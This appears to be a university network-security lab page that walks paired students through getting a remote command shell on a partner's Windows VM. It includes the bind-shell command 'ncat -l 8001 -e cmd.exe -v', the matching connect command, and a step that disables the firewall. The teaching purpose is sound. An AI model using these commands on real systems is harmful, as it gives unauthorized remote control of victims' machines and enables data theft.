---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Getting a Shell

## Objective

Examine and test how threat actors obtain a shell on a remote computer.

**NOTE: This lab is similar to what you did when you used Metasploit to exploit your Windows XP system.**

## Discussion

It is important to understand how attackers are able to obtain a shell on a remote system since it is a common method of maintaining access and stealing data (exfiltration or exfil). Notice that they are able to use any arbitrary port.

## Preparation

1. Each person must change the Network Adapter on their Windows 10 Virtual Machine to “NETSEC-WAN”
   1. You may have to run: ipconfig /release ; ipconfig/renew
2. You should have an IP address in the 10.0.16.XXX range
3. Download nmap on your Windows 10 Virtual Machine: [https://nmap.org/dist/nmap-7.93-setup.exe](https://nmap.org/dist/nmap-7.93-setup.exe)

## Scenario

Assume two systems can directly communicate to each other on an arbitrary port (ie. there's no firewall or other device preventing them from communicating directly to each other.) **Alice is the victim** and **Eve is the attacker** so one of you will be Alice for the duration of the assignment and the other one Eve. **When the first person is done with this lab, switch roles.**

## Begin Lab Preparation

1. **Make a note of each other’s IP address.**
2. **Ensure the two Windows workstations can ping each other and disable the firewall on both hosts.**

**Goal: On Alice’s computer, a \_listener \_(-l**) (lower case L) is started on port 8001 and anyone that connects to it will get a command prompt on Alice's computer. The **-v** is for \_verbose \_mode. It is always a good option so you know what is going on as the shell is being set up.

Alice (Type the command): **ncat -l 8001 -e cmd.exe -v**

Eve Connects to Alice's computer on port 8001.

Eve (Type the command):\*\* ncat X.X.X.X 8001\*\*

Replace X.X.X.X with the IP address of Alice’s computer.

Eve should now see something like this:

**Microsoft Windows \[Version 6.1.7601]**

**Copyright (c) 2009 Microsoft Corporation. All rights reserved.**

**c:\Program Files\Nmap>**

Eve is now logged into Alice's system and can type commands as if she was sitting in front of Alice’s computer.

Run the command:

**ipconfig /all**

which should display the IP address of the windows system of your Partner.
